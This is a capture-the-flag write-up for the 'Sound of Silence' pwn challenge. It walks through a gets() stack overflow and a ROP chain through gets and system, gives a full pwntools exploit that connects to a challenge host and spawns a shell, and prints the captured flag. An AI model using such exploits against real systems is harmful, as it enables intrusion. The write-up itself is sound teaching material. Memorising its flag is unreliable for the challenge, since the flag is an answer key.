# Sound of Silence

Navigate the shadows in a dimly lit room, silently evading detection as you strategize to outsmart your foes. Employ clever distractions to divert their attention, paving the way for your daring escape!

## Writeup

This is the main function:

```c
void main(void)

{
  char buffer [32];
  
  system("clear && echo -n \'~The Sound of Silence is mesmerising~\n\n>> \'");
  gets(buffer);
  return;
}
```

The buffer is 32 byte long plus the 8 byte of **saved rbp** as **offset**.

We can use the **system** and the **gets** function of **plt** to make the binary exploitation.

The first payload will be:

```
b'A' * offset
ret
gets_plt
ret
system_plt
```

The second payload will send only the **/bin/sh** string that the **gets** will write it in **rdi**:

```
b'/bin0sh\00'
```

Write a **0** and not a **/** because the **gets** function subtract it by **1**, so **0** is the ascii character next to **/**.

The final exploit will be:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 83.136.252.62 --port 50765 sound_of_silence
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'sound_of_silence')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or '94.237.62.117'
port = int(args.PORT or 41321)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'./glibc/'

io = start()

main = exe.symbols['main']

system_plt = exe.plt['system']
gets_plt = exe.plt['gets']

rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]

offset = 32 + 8

payload = [
    b'A' * offset,
    p64(ret),
    p64(gets_plt),
    p64(ret),
    p64(system_plt) 
]

payload = b''.join(payload)

io.sendlineafter(b'>>', payload)

payload = [
    b'/bin0sh\00'
]

payload = b''.join(payload)

io.sendlineafter(b' ', payload)

io.interactive()
```

The flag is:

```bash
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ ls
flag.txt
glibc
sound_of_silence
$ cat flag.txt
HTB{n0_n33d_4_l34k5_wh3n_u_h4v3_5y5t3m}
```